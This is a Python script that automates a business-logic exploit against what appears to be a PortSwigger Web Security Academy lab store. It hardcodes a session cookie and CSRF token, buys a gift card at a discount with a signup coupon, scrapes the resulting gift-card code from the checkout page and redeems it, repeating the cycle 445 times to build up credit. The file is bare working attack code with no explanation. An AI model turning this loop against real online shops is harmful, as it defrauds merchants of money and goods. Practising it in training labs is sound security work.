import requests
import urllib3
import sys
import urllib
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session_token = 'o2R4wsCc9auN7h8W4LjHJ8q4u5YkTH9p'


host = 'https://0a5c0003036d4df080003ffb007d008a.web-security-academy.net'



def add_card_to_cart():
	cookies = {'session':session_token}
	data_cart = {'productId':2,'redir':'PRODUCT','quantity':1}
	r = requests.post(f'{host}/cart',cookies = cookies,data = data_cart)
	add_signup_coupon()


def add_signup_coupon():
	cookies = {'session':session_token}
	data = {'csrf':'ALB6JJcK0iyLA1OecTyzmoOyuvOXn0O1','coupon':'SIGNUP30'}
	r = requests.post(f'{host}/cart/coupon',cookies=cookies,data=data)
	checkout()



def add_gift(coupon):
	cookies = {'session':session_token}
	coupon = str(coupon)
	data = {'csrf':'ALB6JJcK0iyLA1OecTyzmoOyuvOXn0O1','gift-card':coupon}
	r = requests.post(f'{host}/gift-card',cookies=cookies,data=data)
	print(r)
	



def checkout():
	cookies = {'session':session_token}
	data = {'csrf':'ALB6JJcK0iyLA1OecTyzmoOyuvOXn0O1'}
	r = requests.post(f'{host}/cart/checkout',cookies=cookies,data=data)
	if r.status_code == 200:
		 soup = BeautifulSoup(r.text, "html.parser")
		 value_element = list(soup.find_all("td"))
		 k = value_element[9].text
		 print(k)
		 add_gift(k)





def couponcode():
	add_card_to_cart()


	



for i in range(445):
	couponcode()




